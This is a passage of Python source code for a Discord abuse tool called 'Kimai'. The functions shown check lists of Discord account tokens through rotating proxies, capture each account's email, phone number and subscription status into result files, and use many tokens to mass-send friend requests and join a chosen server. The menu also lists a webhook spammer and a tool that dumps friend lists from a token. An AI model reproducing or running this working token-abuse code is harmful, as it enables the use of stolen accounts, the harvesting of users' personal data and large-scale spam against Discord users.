                print(f'[{custom}!{Fore.RESET}] Please enter a valid choice such as 1, 2, 3, 4 or 5!')
                os.system('pause >nul')
                self.tokenchecker_capture()
        except:
            self.tokenchecker_capture()

        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select your tokens', multiple= False)
        open(path, "r", encoding="utf-8")
        self.start_time = time()
        total += int(len(path))
        self.clear()
        print(text)
        print()
        with open(path, 'r', encoding="utf-8") as f:
            for token in f:
                self.set_title(f'Kimai | Token Checker With Capture | Valid: {valid} - Invalid: {invalid} | Retries: {retries} | Proxys: {proxylines} {proxy_type} | Elapsed: {self.now_time()}')
                token_load = token.split('\n')
                data = requests.get('https://discord.com/api/v9/users/@me', headers={"Authorization": token_load[0]}, proxies=random.choice(proxys))

                if data.status_code == 200:
                    dated = data.json()
                    try:
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={"Authorization": token_load[0]})
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        if has_nitro:
                            has_nitro = True
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                            print(f'{front}[{custom}Valid{front}]{Fore.WHITE} {custom}{token_load[0]} | {Fore.WHITE}Username: {custom}{dated["username"]}#{dated["discriminator"]} {Fore.WHITE}| Nitro: {Fore.LIGHTGREEN_EX}True | {data.text}')
                        else:
                            has_nitro = False
                            print(f'{front}[{custom}Valid{front}]{Fore.WHITE} {custom}{token_load[0]} | {Fore.WHITE}Username: {custom}{dated["username"]}#{dated["discriminator"]} {Fore.WHITE}| Nitro: {Fore.RED}False')
                    except:
                        has_nitro = None
                        print(f'{front}[{custom}Valid{front}]{Fore.WHITE} {custom}{token_load[0]} | {Fore.WHITE}Username: {custom}{dated["username"]}#{dated["discriminator"]} {Fore.WHITE}| Nitro: {Fore.LIGHTBLACK_EX}None')

                    self.folder = 'Results/TokenChecker'
                    if not os.path.exists('results'):
                        os.mkdir('results')
                    if not os.path.exists(self.folder):
                        os.mkdir(self.folder)
                    
                    valid += 1
                    data = f'''Username: {dated["username"]}#{dated["discriminator"]}
ID: {dated["id"]}
Gmail: {dated["email"]}
Phone: {dated["phone"]}
Token: {token_load[0]}
Nitro: {has_nitro}
Verified: {dated['verified']}
---------------------------------\n'''
                    open(f'Results/TokenChecker/Valid-Tokens-With-Captured-{self.day}-{self.month}-{self.year}-{self.hour}-{self.minute}-{self.seconds}.txt', 'a', encoding="utf-8").write(data)
                    open(f'Results/TokenChecker/Valid-Tokens-RAW-{self.day}-{self.month}-{self.year}-{self.hour}-{self.minute}-{self.seconds}.txt', 'a', encoding="utf-8").write(token_load[0] + '\n')
                
                elif data.status_code == 401:
                    invalid += 1
                    print(f'{front}[{Fore.RED}Invalid token{front}]{Fore.WHITE} - {custom}{token_load[0]}')
                else:
                    retries += 1
        input('Done!, Press ENTER to continue.')
        self.main()

    def splitter(self):
        self.clear()
        self.set_title(args=f'Kimai | Remove lines')
        print(text)
        print()
        print(f'{Fore.WHITE}[{custom}1{Fore.WHITE}] Delete Email:Pass {Fore.WHITE}[{front}Format EMAIL:PASS:TOKEN{Fore.WHITE}]\n{Fore.WHITE}[{custom}2{Fore.WHITE}] Add semicolons and necessary spaces [{custom}Exclusive for nitro sniper by localip{Fore.WHITE}]\n{Fore.WHITE}[{custom}x{Fore.WHITE}] To return\n\n[{custom}Input{Fore.WHITE}] Your choice > ',end='')
        split_choice = str(input())

        if not os.path.exists('results'):
            os.mkdir('results')

        if split_choice == '1':
            try:
                data = open('tokens.txt').read().split('\n')
                
                for i in data:
                    a = re.findall('.*?:.*?:', i)[0]
                    data = i.split(a)
                    print(f'{Fore.WHITE}[{custom}Line{Fore.WHITE}] {Fore.WHITE}{data[1]}')
                    open(f'Results/token-split-{self.day}-{self.month}-{self.year}-{self.hour}-{self.minute}-{self.seconds}.txt', 'a').write(data[1] + '\n')
                    print('Done!, press ENTER to continue!')
                    self.splitter()
            except FileNotFoundError:
                input(f'{Fore.RED}Error: No such file or directory: "tokens.txt" | txt file with name tokens.txt was not found please make a txt file with that name containing your tokens\n\n{Fore.RESET}Press ENTER to continue!')
                self.tools()

        elif split_choice == '2':
            try:
                data = open('tokens.txt').read().split('\n')
                for i in data:
                    print(f"{Fore.WHITE}[{custom}Line{Fore.WHITE}] {custom}{i}")
                    if not os.path.exists('results'):
                        os.mkdir('results')
                    open(f'Results/token-for-sniping-localip-sniper-{self.day}-{self.month}-{self.year}-{self.hour}-{self.minute}-{self.seconds}.txt', 'a').write(f"         '{i}',\n")
                    input('Done, ENTER for continue')
                    self.splitter()
            except FileNotFoundError:
                input(f'{Fore.RED}Error: No such file or directory: "tokens.txt" | txt file with name tokens.txt was not found please make a txt file with that name containing your tokens\n\n{Fore.RESET}Press ENTER to continue!')
                self.tools()
        elif split_choice == 'x':
            self.tools()
        else:
            self.splitter()

    def tools(self):
        self.set_title(args=f'Kimai v{__current_version__} | Main menu - beete#1337')
        self.clear()
        print(text)
        print()
        print(f'{Fore.WHITE}[{custom}1{Fore.WHITE}] Remove duplicates\n{Fore.WHITE}[{custom}2{Fore.WHITE}] Edit tokens\n{Fore.WHITE}[{custom}3{Fore.WHITE}] Proxyscraper\n\n{Fore.WHITE}[{custom}b{Fore.WHITE}] Back to de main menu.\n\n{Fore.WHITE}[{custom}Input{Fore.WHITE}] Choice : ', end='')
        tools_choice = input(str())

        if tools_choice == '1':
            self.remove_duplicates()
        elif tools_choice == '2':
            self.splitter()
        elif tools_choice == '3':
            self.proxyscraper()
        elif tools_choice == 'b':
            self.main()
        else:
            self.tools()

    def friendspammer(self):
        send = 0
        invalid = 0
        locked = 0
        proxys = 0
        proxy_loads = []
        tokens_loads = []
        tokens_load = 0

        proxytype = 'https'
        loader = requests.get(self.proxy_api).text.splitlines()
        for l in loader:
            ip = l.split(":")[0]
            port = l.split(":")[1]
            proxy_loads.append({'http': 'https'+'://'+ip+':'+port.rstrip("\n")})
            proxy_type = 'From API'

        self.clear()
        print(text)
        print()

        print(f'{Fore.MAGENTA}{len(loader)} Proxys loaded from API')
        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select your tokens', multiple= False)
        path_2 = open(path, encoding="utf-8").read().split('\n')
        
        for i in path_2:
            tokens_load += 1
       
        total_proxy = loader
        proxys += len(total_proxy)

        self.set_title('Kimai | Friend Request Spammer | Menu.')
        print(f'{Fore.WHITE}[{custom}Input{Fore.WHITE}] Enter a user [{front}Example: beete#1337{Fore.WHITE}] > ', end='')
        user = input()

        self.start_time = time()
        self.clear()
        print(text)
        print()
        with open(path, 'r', encoding="utf-8") as f:
            for token in f:
                self.set_title(f'Kimai | Friend Request Spammer | Send: {send} - Invalid Tokens: {invalid} - Locked Account: {locked} | Proxys: {proxys} From API | Tokens loaded: {tokens_load} | Elapsed: {self.now_time()}')
                token_loadz = token.split('\n')[0]
                try:
                    username = user.split("#")[0]
                    discriminator = user.split("#")[1]
                except:
                    self.friendspammer()

                url = "https://discord.com/api/v9/users/@me/relationships"
                headers = {
                    "accept": "/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en-CH;q=0.9,en-GB;q=0.8",
                    "authorization": token_loadz,
                    "content-length": "0",
                    "origin": "https://discord.com",
                    "referer": "https://discord.com/channels/@me",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.669 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
                    "x-debug-options": "bugReporterEnabled",
                    "x-discord-locale": "hu",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42NjkiLCJvc192ZXJzaW9uIjoiMTAuMC4xOTA0MyIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMzMwOTgsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                body = {"username": username, "discriminator": discriminator}
                res = requests.post(url, headers=headers, json=body, proxies=random.choice(proxy_loads))
                
                if not os.path.exists('results'):
                    os.mkdir('results')
                    
                if res.status_code == 204:
                    send += 1
                    print(f'{Fore.WHITE}[{Fore.LIGHTGREEN_EX}Friend Send{Fore.WHITE}] - {front}{token_loadz}')
                    open(f'Results/Friend-Spam-Unlocked-Account-{self.day}-{self.month}-{self.year}-{self.hour}-{self.minute}-{self.seconds}.txt', 'a').write(token_loadz + '\n')
                elif res.status_code == 401:
                    invalid += 1
                    print(f'{Fore.WHITE}[{Fore.RED}Invalid Token{Fore.WHITE}] - {front}{token_loadz}')
                else:
                    locked += 1
                    print(f'{Fore.WHITE}[{custom}Locked Account{Fore.WHITE}] - {front}{token_loadz}')
        input('DDOOOOOONEEEEEE! ENTER TO CONTINUE BRO!')
        self.main()

    def token_joiner(self):
        send = 0
        invalid = 0
        locked = 0
        proxys = 0
        proxy_loads = []
        tokens_loads = []
        tokens_load = 0
        proxytype = 'https'
        
        loader = requests.get(self.proxy_api).text.splitlines()
        for l in loader:
            ip = l.split(":")[0]
            port = l.split(":")[1]
            proxy_loads.append({'http': 'https'+'://'+ip+':'+port.rstrip("\n")})
            proxy_type = 'From API'

        self.clear()
        print(text)
        print()

        print(f'{Fore.MAGENTA}{len(loader)} Proxys loaded from API')
        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select your tokens', multiple= False)
        path_2 = open(path, encoding="utf-8").read().split('\n')
        
        for i in path_2:
            tokens_load += 1
       
        total_proxy = loader
        proxys += len(total_proxy)

        self.set_title('Kimai | Token Joiner | Menu.')
        print(f'{Fore.WHITE}{custom}>_ {Fore.WHITE}Server invite link > ', end='')
        server = input()

        if len(server) > 6:
            server = server[19:]
            apilink = "https://discordapp.com/api/v6/invite/" + str(server)

        self.start_time = time()
        self.clear()
        print(text)
        print()

        with open(path, 'r', encoding="utf-8") as f:
            for token in f:
                enter_token = token.split('\n')[0]
                self.set_title(f'Kimai | Token Joiner | Send: {send} - Bad requests: {invalid} - Locked Account: {locked} | Proxys: {proxys} From API | Tokens loaded: {tokens_load} | Elapsed: {self.now_time()}')

                headers={
                    'Authorization': enter_token
                }
                data = requests.post(apilink, headers=headers, proxies=random.choice(proxy_loads))

                if data.status_code == 200:
                    send += 1
                    print(f'{Fore.WHITE}[{Fore.LIGHTGREEN_EX}Token joined{Fore.WHITE}] - {front}{enter_token}')
                elif data.status_code == 400:
                    invalid += 1
                    print(f'{Fore.WHITE}[{Fore.RED}Bad Request{Fore.WHITE}] - {front}{enter_token}')
                elif data.status_code == 429:
                    print(f'To many request waiting 5 seconds')
                    sleep(5)
                else:
                    locked += 1
                    print(data.status_code)
                    print(f'{Fore.WHITE}[{custom}Locked Token{Fore.WHITE}] - {front}{enter_token}')
            input('Done press ENTER to continue!')
            self.main()

    def main(self):
        self.clear()
        print(fr'''
{front}██{custom}╗{front}  ██{custom}╗{front}██{custom}╗{front}███{custom}╗   {front}███{custom}╗ {front}█████{custom}╗ {front}██{custom}╗ 
{front}██{custom}║{front} ██{custom}╔╝{front}██{custom}║{front}████{custom}╗ {front}████{custom}║{front}██{custom}╔══{front}██{custom}╗{front}██{custom}║                 Version: {front}{__current_version__}
{front}█████{custom}╔╝ {front}██{custom}║{front}██{custom}╔{front}████{custom}╔{front}██{custom}║{front}███████{custom}║{front}██{custom}║                 Alpha version :3
{front}██{custom}╔═{front}██{custom}╗ {front}██{custom}║{front}██{custom}║╚{front}██{custom}╔╝{front}██{custom}║{front}██{custom}╔══{front}██{custom}║{front}██{custom}║
{front}██{custom}║  {front}██{custom}╗{front}██{custom}║{front}██{custom}║ ╚═╝ {front}██{custom}║{front}██{custom}║  {front}██{custom}║{front}██{custom}║
{custom}╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝        
''')     
        try:
            self.set_title(args=f'Kimai v{__current_version__} | Main menu - beete#1337')
            symbol = self.randomize(parms=['-', '+'])
            print(f'{Fore.WHITE}[{custom}{symbol}{Fore.WHITE}] Welcome {custom}{self.pc_name}{Fore.WHITE} Thanks for using {custom}Kimai{Fore.WHITE}!')
            print(f'\n{Fore.WHITE}[{custom}1{Fore.WHITE}] DumpFriends [{custom}from token{Fore.WHITE}]\n[{custom}2{Fore.WHITE}] TokenInfo [{custom}Token Required{Fore.WHITE}]\n[{custom}3{Fore.WHITE}] EasyRPC [{custom}Create your easy rich-presence{Fore.WHITE}]\n[{custom}4{Fore.WHITE}] Webhook Spammer\n{Fore.WHITE}[{custom}5{Fore.WHITE}] TokenChecker {Fore.WHITE}[{custom}Tokens in txt file required{Fore.WHITE}]\n[{custom}6{Fore.WHITE}] TokenChecker {Fore.WHITE}[{custom}With Capture{Fore.WHITE}]\n{Fore.WHITE}[{custom}7{Fore.WHITE}] Friend-Spam\n{Fore.WHITE}[{custom}8{Fore.WHITE}] Token Joiner [{custom}The tokens enter a specific discord server{Fore.WHITE}]\n\n{Fore.WHITE}[{custom}x{Fore.WHITE}] Press to go to the tools section')
            print(f'\n{Fore.WHITE}[{custom}Input{Fore.WHITE}] Select your choice {custom}> {Fore.WHITE}', end='')
            option = input()
        
            if option == '1':
                enter_token = input(f'{Fore.WHITE}[{custom}Input{Fore.WHITE}] Enter discord token: ')
                self.clear()
                self.dumpfriends(token=self.tokenstrip(token=str(enter_token)))
            elif option == '2':
                enter_token = input(f'{Fore.WHITE}[{custom}Input{Fore.WHITE}] Enter discord token: ')
                self.clear()
                self.Tokeninfo(token=self.tokenstrip(token=str(enter_token)))
            elif option == '3':
                self.easyrpc()
            elif option == '4':
                self.webhookspam()
            elif option == '5':
                self.tokenchecker()
            elif option == '6':
                self.tokenchecker_capture()
            elif option == '7':
                self.friendspammer()
            elif option == '8':
                self.token_joiner()
            elif option == 'x':
                self.tools()
            else:
                self.main()
        except KeyboardInterrupt:
            print(f'{Fore.RED}Good bye! | Error: KeyboardInterrupt')
            input('Enter for continue!')
            quit()

    def menu(self):
        self.main()

    def loading(self):
        randoms_color = [Colors.blue_to_green, Colors.cyan_to_green, Colors.cyan_to_blue, Colors.blue_to_purple, Colors.red_to_white, Colors.blue_to_cyan, Colors.red_to_purple, Colors.red_to_yellow]
        randoms_dir = [Colorate.Vertical, Colorate.Horizontal]
        Anime.Fade(Center.Center(random.choice(banners)), random.choice(randoms_color), random.choice(randoms_dir), time=2, interval=0)
  
if __name__ == '__main__':
    Kimai()
